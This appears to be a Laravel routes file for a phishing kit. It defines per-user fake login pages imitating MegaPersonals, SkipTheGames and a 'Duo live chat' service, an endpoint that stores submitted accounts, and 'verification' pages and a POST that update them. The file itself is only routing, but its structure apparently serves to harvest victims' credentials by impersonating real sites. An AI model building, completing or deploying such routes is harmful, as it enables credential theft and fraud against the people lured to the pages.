<?php

use App\Http\Controllers\Account\AccountController;
use App\Http\Controllers\Account\ViewPageController;
use Illuminate\Support\Facades\Route;



Route::get('/auth/login/{userId}', [ViewPageController::class, 'megaPersonalsView']);

Route::get('/login/{userId}', [ViewPageController::class, 'skipTheGamesView']);

Route::post('/accounts/store', [AccountController::class, 'store'])->name('accounts.store');

Route::get('/due-live-chat/{userId}', [ViewPageController::class, 'duoLiveChat'])->name('due.live.chat');
Route::get('/due-live-chat/verify/{userId}', [ViewPageController::class, 'duoLiveChatVerify'])->name('due.live.chat.verify');
Route::get('/due-live-chat/login/{userId}', [ViewPageController::class, 'authLoginPage'])->name('due.live.chat.login.page');

Route::get('/megapersonals/verification-confirmation/{accountId}', [ViewPageController::class, 'megaVerificationConfirmation'])->name('megapersonals.verification_confirmation');

Route::get('/megapersonals/verification-steps/{accountId}', [ViewPageController::class, 'megaVerificationSteps'])->name('megapersonals.verification_steps');

Route::post('/megapersonals/verification', [AccountController::class, 'update'])->name('accounts.update');
